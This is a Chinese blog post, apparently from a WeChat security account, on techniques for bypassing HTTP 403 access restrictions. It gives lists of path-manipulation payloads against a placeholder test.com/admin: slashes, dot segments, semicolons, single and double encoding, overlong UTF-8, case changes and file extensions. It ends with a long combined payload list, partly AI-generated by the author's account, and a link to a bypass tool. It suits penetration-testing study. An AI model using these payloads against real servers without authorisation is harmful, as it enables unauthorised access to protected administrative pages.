---
title: 古法渗透测试之403绕过技巧
url: https://mp.weixin.qq.com/s/ke-dMM_1rrFHCPiIDMOF8w
source: Doonsec's feed
date: 2026-11-24
fetch_date: 2026-11-25T10:42:55.474790
---

# 古法渗透测试之403绕过技巧

# 古法渗透测试之403绕过技巧

原创

小白哥
小白哥

小白安全成长记

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

### 403bypass的一些方法

看够了漫天的ai,来看点古法渗透测试吧，今天在温习一个老知识，403绕过。

## 何为403绕过

403 Forbidden 响应表示服务器理解请求，但拒绝授权——通常是由于访问控制规则。然而，Web 服务器或应用程序中的配置错误、逻辑缺陷或意外解析有时会被利用来绕过这些限制。下面将介绍最常见和最基础的 test 操作方法。当您遇到 403 响应时，这些方法应该是您的起点。

## 1. 斜杠线使用技巧

服务器通常会将多个斜杠（// 或 ///）规范化为单个斜杠，但实现不佳的访问控制检查可能只会检查规范路径。

```
test.com//admin//
test.com///admin///
test.com/admin\/\/
test.com/admin\\..
test.com//;//admin
test.com//;//admin/
```

## 为什么有效

不同的框架（Nginx、Apache、IIS 等）对连续的斜杠或反斜杠的处理方式不同，有时会忽略它们，有时会以意想不到的方式解释它们。

## 2. 点斜杠 & 点点斜杠

如果应用程序的访问控制没有正确清理点段，则像 ./（当前目录）或 ../（父目录）这样的点段可能会使路径规范化变得混乱。

```
test.com/./admin/./
test.com/admin/./
test.com/admin/..
test.com/admin/../
test.com/admin/..;/
test.com/admin/..%3B/
test.com/./admin
test.com/admin/.//
```

## 为什么有效

服务器可能会以 WAF 或访问控制逻辑无法预期的方式处理 . 和 ..（尤其是在与编码或额外符号结合使用时）。

## 3. 查询字符串和参数操作

在字符串末尾添加问号、额外的参数或奇怪的查询字符串有时可以绕过简单的基于路径的检查。

```
test.com/admin/?
test.com/admin??
test.com/admin/??/
test.com/admin?id=1
test.com/admin?id=1&dummy=2
test.com/admin?&   (empty parameter)
```

## 为什么有效

有些框架只检查“?”之前的路径部分，忽略或错误地处理查询参数。

## 4. 特殊字符注入

使用特殊字符或非常规路径分隔符（;、#、\*、~ 等）：

```
test.com/admin/#
test.com/admin/#/
test.com/admin/*
test.com/admin~
test.com/admin/°/
test.com/admin/-
test.com/admin/&
test.com/admin(…)
test.com/admin!…
test.com/admin@…
test.com/admin#
test.com/..;/admin
test.com/.;/admin
test.com/.;/admin/
```

## 为什么有效

某些字符可能会破坏或绕过路径验证程序。尤其是在 Tomcat/Apache 环境中，分号 (;) 是一种常见的伎俩。

## 5. 编码与混合编码

正确或不正确的编码路径都可以绕过只匹配未编码字符串的过滤器。可以结合多层编码或部分编码：

## 通用编码

```
test.com/admin/%20
test.com/admin/%2f
test.com/admin/%09
test.com/admin/%0a
test.com/admin/%0d
test.com/admin/%25
test.com/admin/%3f
test.com/admin/%26
test.com/admin/%00
```

## 双重/三重编码

`test.com/admin/%252f (Decodes to %2f -> '/') test.com/admin%25253F (Double-encoded '?')`

##Unicode/Overlong UTF-8

```
test.com/%u0061dmin    (Unicode for 'admin')
test.com/%c0%afadmin   (Overlong UTF-8 for '/')
test.com/admin%e5%98%8a%e5%98%8d  (Obscure Unicode)
```

## 为什么有效

WAF 和访问控制通常只有一个解码步骤。如果进行双重或三重编码，则可能会绕过第一个过滤器。

## 6. 大小写差异和拼写错误

在基于 Windows 的服务器或其他不区分大小写的文件系统中，更改大小写可能有所帮助。某些应用程序会进行严格检查，要求 admin 必须小写：

```
test.com/ADMIN
test.com/ADMIN/
test.com/ADM+IN
test.com/AdMiN
```

## 为什么有效

服务器（或应用程序路由）可能对路径不区分大小写，而 WAF 或重写规则则区分大小写。

## 7. 文件扩展名和空字节技巧

添加或删除文件扩展名可能会绕过基于扩展名的过滤器。

```
test.com/admin.json
test.com/admin.css
test.com/admin.html
test.com/admin.php~
test.com/admin.old
test.com/admin.bak
test.com/admin.inc
test.com/admin.~
test.com/admin%00
```

## 为什么有效

有些服务器只屏蔽 .php 或 .asp 文件，却忽略了 .json 或 .bak 文件。空字节 (%00) 可能会导致较旧或编写不佳的代码无法完成路径检查。

### 接下来是送的， 有的是用ai跑出来的

```
test.com/admin/?
test.com//admin//
test.com///admin///
test.com/./admin/./
test.com/admin?
test.com/admin??
test.com/admin??
test.com/admin/?/
test.com/admin/??
test.com/admin/??/
test.com/admin/..
test.com/admin/../
test.com/admin/./
test.com/admin/.
test.com/admin/.//
test.com/admin/*
test.com/admin//*
test.com/admin/%2f
test.com/admin/%2f/
test.com/admin/%20
test.com/admin/%20/
test.com/admin/%09
test.com/admin/%09/
test.com/admin/%0a
test.com/admin/%0a/
test.com/admin/%0d
test.com/admin/%0d/
test.com/admin/%25
test.com/admin/%25/
test.com/admin/%23
test.com/admin/%23/
test.com/admin/%26
test.com/admin/%3f
test.com/admin/%3f/
test.com/admin/%26/
test.com/admin/#
test.com/admin/#/
test.com/admin/#/./
test.com/./admin
test.com/./admin/
test.com/..;/admin
test.com/..;/admin/
test.com/.;/admin
test.com/.;/admin/
test.com/;/admin
test.com/;/admin/
test.com//;//admin
test.com//;//admin/
test.com/admin/./
test.com/%2e/admin
test.com/%2e/admin/
test.com/%20/admin/%20
test.com/%20/admin/%20/
test.com/admin/..;/
test.com/admin.json
test.com/admin/.json
test.com/admin..;/
test.com/admin;/
test.com/admin%00
test.com/admin.css
test.com/admin.html
test.com/admin?id=1
test.com/admin~
test.com/admin/~
test.com/admin/°/
test.com/admin/&
test.com/admin/-
test.com/admin\/\/
test.com/admin/..%3B/
test.com/admin/;%2f..%2f..%2f
test.com/ADMIN
test.com/ADMIN/
test.com/admin/..\;/
test.com/*/admin
test.com/*/admin/
test.com/ADM+IN
test.com/ADM+IN/
```

### 推荐个工具

* https://github.com/devploit/nomore403

就这样吧，大家自觉遵守网络安全法吧。艹，手贱删除了一台能珍藏多年的小鸡。。。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/EhWx22VKFBg0hrB58Q3PaRC6G2rPMW7pruxicEKOicpBXrickYY3FNnkPwknibIgaEH9dTVfhpAiafhHkhkZ7O8iaeNQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
推荐
，轻点两下取消推荐
分享
留言
收藏
听过